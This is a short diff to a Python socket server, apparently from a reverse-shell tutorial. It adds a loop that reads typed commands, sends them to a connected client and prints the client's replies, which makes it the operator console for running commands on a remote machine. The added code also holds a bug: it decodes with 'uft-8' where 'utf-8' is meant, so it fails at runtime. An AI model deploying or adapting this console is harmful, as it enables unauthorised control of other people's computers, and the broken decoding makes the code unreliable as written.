@@ -32,3 +32,22 @@ def socket_accept():
 	print("Connection has been established | " + "IP " +  address[0] + " | Port " + str(address[1]))
 	send_commands(conn)
 	conn.close()
+
+# Send commands
+def send_commands(conn):
+	while True:
+		cmd = input()
+		if cmd == 'quit':
+			conn.close()
+			s.close()
+			sys.exit()
+		if len(str.encode(cmd)) > 0: #sys command input are in bytes, not strings; must encode/decode accordingly
+			conn.send(str.encode(cmd))
+			client_response = str(conn.recv(1024), "uft-8")
+			print(client_response, end="") #end="" keeps the cursor from moving to a new line
+
+def main():
+	socket_create()
+	socket_bind()
+	socket_accept()
+main()
